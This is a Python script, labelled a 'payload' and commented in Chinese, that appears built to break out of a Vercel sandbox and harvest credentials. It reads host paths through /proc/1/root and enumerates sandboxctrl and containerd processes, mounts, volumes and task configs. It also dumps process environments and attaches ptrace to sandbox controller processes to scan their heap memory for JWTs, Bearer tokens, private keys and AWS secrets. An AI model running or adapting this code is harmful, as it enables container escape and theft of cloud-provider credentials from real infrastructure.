# -*- coding: utf-8 -*-
"""v151 payload: sandboxctrl 侦察 + drive 设备定位 + sandboxctrl/sandbox-init 堆凭证扫描
输出 /vercel/sandbox/v151c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v151c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def readp(pid, name, n=8000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def find_procs(comm):
    out = []
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    if open('/proc/%s/comm' % d).read().strip() == comm:
                        out.append(int(d))
                except Exception:
                    pass
    except Exception:
        pass
    return out


def mem_scan_heap(pid, kws, tag='', max_bytes=40 * 1024 * 1024, max_found=12, ctx=250):
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        try:
            os.waitpid(pid, os.WUNTRACED)
        except Exception:
            pass
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        targets = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            base = int(a, 16)
            size = int(b, 16) - base
            perm = parts[1]
            if perm[0] != 'r' or size < 4096:
                continue
            if base >= 0xc000000000 or (perm[1] == 'w' and size < 100 * 1024 * 1024):
                targets.append((base, size, perm))
        log('%s heap regions=%d' % (tag, len(targets)))
        total = 0
        found = 0
        for base, size, perm in targets:
            if total >= max_bytes or found >= max_found:
                break
            want = min(size, max_bytes - total)
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(want)
                mf.close()
                total += len(chunk)
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(re.escape(kw), chunk):
                        s = max(0, m.start() - ctx)
                        seg = chunk[s:m.end() + ctx]
                        printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                        if printable * 10 < len(seg) * 3:
                            continue
                        log('%s MEM %s @0x%x: %r' % (tag, kw, base + m.start(), seg))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s heap scan done bytes=%d found=%d' % (tag, total, found))
        try:
            libc.ptrace(17, pid, 0, 0)
        except Exception:
            pass
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


# ============ 1: sandboxctrl 进程侦察 ============
log('=== 1 sandboxctrl ===')
pids = find_procs('sandboxctrl')
log('sandboxctrl pids=%s' % pids)
for pid in pids:
    log('sc %d cmdline=%r' % (pid, readp(pid, 'cmdline', 500)))
    env = readp(pid, 'environ', 8000).decode(errors='replace').replace('\x00', ' | ')
    log('sc %d environ=%s' % (pid, env))
    log('sc %d exe=%s' % (pid, os.readlink('/proc/%d/exe' % pid)))
    # fd 里的 unix socket
    try:
        for fd in sorted(os.listdir('/proc/%d/fd' % pid)):
            try:
                tgt = os.readlink('/proc/%d/fd/%s' % (pid, fd))
                if 'sock' in tgt or '.sock' in tgt or 'init' in tgt:
                    log('sc fd %s -> %s' % (fd, tgt))
            except Exception:
                pass
    except Exception:
        pass
    # mountinfo 找 drive
    try:
        mi = readp(pid, 'mountinfo', 12000).decode(errors='replace')
        for ln in mi.splitlines():
            if 'vdb' in ln or 'drive' in ln or ' / ' in ln or 'volumes' in ln or 'overlay' in ln:
                log('sc MI %s' % ln[:300])
    except Exception as e:
        log('sc mountinfo EXC %s' % e)

# ============ 2: 各进程 mountinfo (找 drive 设备) ============
log('=== 2 mountinfos ===')
for pid, name in [(1, 'celld'), (490, 'containerd')]:
    try:
        mi = readp(pid, 'mountinfo', 16000).decode(errors='replace')
        for ln in mi.splitlines():
            if 'vdb' in ln or 'vda' in ln or 'drive' in ln or 'volumes' in ln:
                log('%s MI %s' % (name, ln[:280]))
    except Exception as e:
        log('%s MI EXC %s' % (name, e))

# ============ 3: blockfile / sandbox controller / volumes ============
log('=== 3 blockfile etc ===')
for base in [R + '/var/lib/containerd/io.containerd.snapshotter.v1.blockfile',
             R + '/var/lib/containerd/io.containerd.sandbox.controller.v1.shim',
             R + '/var/lib/containerd/io.containerd.snapshotter.v1.erofs',
             R + '/var/lib/containerd/tmpmounts']:
    try:
        entries = sorted(os.listdir(base))[:40]
        log('LS %s = %s' % (base, entries))
        for e in entries:
            fp = base + '/' + e
            try:
                st = os.stat(fp)
                if st.st_mode & 0o170000 == 0o040000:
                    log('  DIR %s/ = %s' % (fp, sorted(os.listdir(fp))[:20]))
                else:
                    log('  FILE %s (%d)' % (fp, st.st_size))
            except Exception:
                pass
    except Exception as e:
        log('ls %s EXC %s' % (base, e))
# /volumes 递归
for base in [R + '/volumes']:
    try:
        for n1 in sorted(os.listdir(base))[:30]:
            p1 = base + '/' + n1
            try:
                st1 = os.stat(p1)
                if st1.st_mode & 0o170000 == 0o040000:
                    log('VOL %s/ = %s' % (p1, sorted(os.listdir(p1))[:30]))
                    for n2 in sorted(os.listdir(p1))[:10]:
                        p2 = p1 + '/' + n2
                        try:
                            st2 = os.stat(p2)
                            if st2.st_mode & 0o170000 == 0o040000:
                                log('  VOL %s/ = %s' % (p2, sorted(os.listdir(p2))[:20]))
                            else:
                                log('  VOL %s (%d)' % (p2, st2.st_size))
                        except Exception:
                            pass
                else:
                    log('VOL %s (%d)' % (p1, st1.st_size))
            except Exception:
                pass
    except Exception as e:
        log('volumes EXC %s' % e)

# ============ 4: containerd task rootfs ============
log('=== 4 task rootfs ===')
try:
    base = R + '/run/containerd/io.containerd.runtime.v2.task/default'
    for cid in sorted(os.listdir(base))[:20]:
        log('task %s' % cid)
        rp = base + '/' + cid + '/rootfs'
        try:
            st = os.stat(rp)
            log('  rootfs st_dev=%d mode=%o' % (st.st_dev, st.st_mode))
        except Exception as e:
            log('  rootfs EXC %s' % e)
        for fn in ['config.json', 'log.json', 'shim.pid']:
            fp = base + '/' + cid + '/' + fn
            try:
                data = open(fp, 'rb').read(1500)
                log('  %s: %r' % (fn, data[:600]))
            except Exception:
                pass
except Exception as e:
    log('task EXC %s' % e)

# ============ 5: sandboxctrl 堆扫描 ============
log('=== 5 sc heap ===')
if pids:
    mem_scan_heap(pids[0],
                  [b'eyJ', b'Bearer ', b'Authorization', b'hvc_iad1', b'PRIVATE KEY',
                   b'AWS_SESSION', b'x-amz-', b'access_key', b'secret'],
                  tag='sc', max_bytes=40 * 1024 * 1024, max_found=12, ctx=250)

# ============ 6: sandbox-init 堆扫描 ============
log('=== 6 init heap ===')
try:
    init_pid = None
    for d in sorted(os.listdir(R + '/run/cell/runc')):
        try:
            init_pid = int(open(R + '/run/cell/runc/%s/container.pid' % d).read().strip())
        except Exception:
            pass
    if init_pid:
        mem_scan_heap(init_pid,
                      [b'eyJ', b'Bearer ', b'Authorization', b'hvc_iad1', b'PRIVATE KEY',
                       b'drive', b'init.sock'],
                      tag='init', max_bytes=40 * 1024 * 1024, max_found=12, ctx=250)
    else:
        log('no init pid')
except Exception as e:
    log('init heap EXC %s' % e)

log('V151_DONE')
f.close()
